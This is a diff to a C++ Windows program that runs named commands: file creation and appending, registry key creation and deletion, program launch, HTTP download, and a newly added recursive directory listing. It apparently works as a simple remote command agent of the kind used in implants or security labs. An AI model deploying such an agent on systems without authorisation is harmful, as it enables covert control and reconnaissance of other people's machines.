@@ -6,6 +6,8 @@
 #include <iostream>
 #include <wininet.h>
 #include <strsafe.h>
+#include <tchar.h> 
+#include <stdio.h>
 
 
 #pragma comment(lib, "Ws2_32.lib")
@@ -22,6 +24,7 @@ int createkey();
 int deletekey();
 int run();
 int httpdownload();
+bool listdir(LPCTSTR lpcszFolder, int nLevel);
 
 char command[100];
 char filename[100];
@@ -117,6 +120,8 @@ int main()
 
 
 DWORD WINAPI choosefunction(LPVOID lpParameter) {
+    
+    Sleep(1000);
 
     if (strcmp(command, "createfile") == 0)
     {
@@ -145,6 +150,10 @@ DWORD WINAPI choosefunction(LPVOID lpParameter) {
     else if (strcmp(command, "httpdownload") == 0)
     {
         return httpdownload();
+    }
+    else if (strcmp(command, "listdir") == 0)
+    {
+        return listdir(filename, 0);
     }
 
 }
@@ -200,7 +209,6 @@ int appendfile() {
         cout << "CreateFile() Failure \n";
         ExitThread(-1);
     }
-    cout << content;
     string auxiliary;
     auxiliary = content;
     if (WriteFile(
@@ -260,7 +268,7 @@ int createkey() {
         &hKey,
         NULL
     ) == ERROR_SUCCESS) {
-        cout << "deletefile succes \n";
+        cout << "createkey succes \n";
         RegCloseKey(hKey);
         ExitThread(1);
     }
@@ -286,7 +294,7 @@ int deletekey() {
 
         if (!RegDeleteKey(hKey, subkey.c_str())) {
             RegCloseKey(hKey);
-            cout << "deletefile succes \n";
+            cout << "deletekey succes \n";
             ExitThread(1);
         }
         else {
@@ -432,8 +440,53 @@ int httpdownload() {
     strcpy(filename, "download.txt");
     strcpy(content, buffer);
     appendfile();
-
+    cout << "httpdownload succes \n";
     InternetCloseHandle(hHttpOpenRequest);
     InternetCloseHandle(hInternetConnect);
 
 }
+
+//Reference https://www.codeproject.com/Articles/93141/Iterative-Implementation-of-Recursively-Enumeratin
+bool listdir(LPCTSTR lpcszFolder, int nLevel = 0) 
+    {
+        WIN32_FIND_DATA ffd;
+        TCHAR szDir[MAX_PATH];
+        HANDLE hFind = INVALID_HANDLE_VALUE;
+
+        StringCchCopy(szDir, MAX_PATH, lpcszFolder);
+        StringCchCat(szDir, MAX_PATH, TEXT("\\*"));
+
+        hFind = FindFirstFile(szDir, &ffd);
+
+        if (INVALID_HANDLE_VALUE == hFind)
+        {
+            return false;
+        }
+
+        TCHAR szOutLine[MAX_PATH] = { 0 };
+        for (int ii = 0; ii < nLevel; ++ii)
+            szOutLine[ii] = _T('\t');
+
+        do
+        {
+            if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+            {
+                if (_T('.') != ffd.cFileName[0])
+                {
+                    _tprintf(TEXT("%s%s   <DIR>\n"),
+                        szOutLine, ffd.cFileName);
+                    StringCchCopy(szDir + _tcslen(lpcszFolder) + 1,
+                        MAX_PATH, ffd.cFileName);
+                    listdir(szDir, nLevel + 1);
+                }
+            }
+            else
+            {
+                _tprintf(TEXT("%s%s\n"), szOutLine, ffd.cFileName);
+            }
+        } while (FindNextFile(hFind, &ffd) != 0);
+
+        FindClose(hFind);
+        cout << "listdir succes \n";
+        return true;
+    }
